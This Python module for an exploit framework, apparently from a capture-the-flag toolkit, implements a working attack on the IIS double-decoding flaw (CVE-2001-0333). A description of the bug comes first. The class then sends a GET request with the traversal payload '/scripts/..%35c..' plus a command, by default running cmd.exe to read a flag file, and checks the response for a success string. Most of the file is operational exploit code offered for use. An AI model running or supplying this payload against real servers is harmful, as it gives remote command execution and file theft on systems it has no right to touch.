import interfaces.exploit as exploit
from interfaces.exploit import Exploit, ExploitError
from interfaces.hasparameters import StringParam
import managers.http as HTTP

desc =	''' 
<br>
<hr><center><big><b>
IIS Double-Enconding
</b></big></center><hr>
<br>
<b>Vulnerability:</b><hr>		
MS IIS/PWS Escaped Characters Decoding Command Execution Vulnerability
<br><br>
Due to a flaw in the handling of CGI filename program requests, it is
possible for a remote user to execute arbitrary commands on an IIS host.
When IIS receives a CGI filename request, it automatically performs two
actions before completing the request. First IIS decodes the filename to
determine the filetype and the legitimacy of the file. IIS then carries out 
a security check. Once the security check is completed, IIS continues with
the second action which involves the decoding of CGI parameters. A flaw in
IIS involves a third undocumented action: typically IIS decodes only the CGI
parameter at this point, yet the previously decoded CGI filename is
mistakenly decoded twice. If a malformed filename is submitted and
circumvents the initial security check, the undocumented procedure will
decode the malformed request, possibly allowing the execution of arbitrary
commands.<br>
It should be noted that arbitrary commands will be run with the
IUSR_machinename account privileges.
<br><br>
The worm Nimda(and variants) actively exploit this vulnerability.
<br><br>
<b>References</b><hr>
CVE-2001-0333<br>
Bugtraq 2708<br>
<br>
<b>Attack Details</b><hr>
The attack send an HTTP request containing a double-encoded sequence of
characters allowing the attacker to execute an arbitrary command.<br>
The actual url is the following:<br>
"/scripts/..%25%35%63.." + CMD

<br><br>
Parameters:<br>
[CMD]: represents the command to be executed in the target host<br>
[RESULT]: 
<br><br><br>
'''


class DoubleEncoding(Exploit):

	def __init__(self):
		Exploit.__init__(self,'IIS Double-Encoding', desc)
		self.res	= None 
		self.add_param(StringParam('CMD','/winnt/system32/cmd.exe?/c+type+c:\\flag.txt', 'The command to be executed during the attack'))
		self.add_param(StringParam('RESULT','OK','The string that must be present in the result if the attack is successful'))

	def execute(self):
		self.res = None
		http = HTTP.HttpManager()

		# %%35c oppure %25%35%63
		url = "/scripts/..%%35c.."+self.CMD
		cmd = "GET "+url
				
		self.log.info("Sending %s"%cmd)
		
		req = HTTP.HttpRequest(cmd, header={'host':'none'})
		
		if(http.send_request(req) == False):
			self.log.error("Request failed")
			raise ExploitError("Connection or request failed")
		
		self.res = http.get_http_response()
		
		self.log.debug("RESULT: \r\n%s"%self.res)
	
		http.close()	
		
	def isSuccessful(self):
		if self.RESULT in str(self.res):
			return exploit.RES_OK
		else:
			return exploit.RES_FAIL

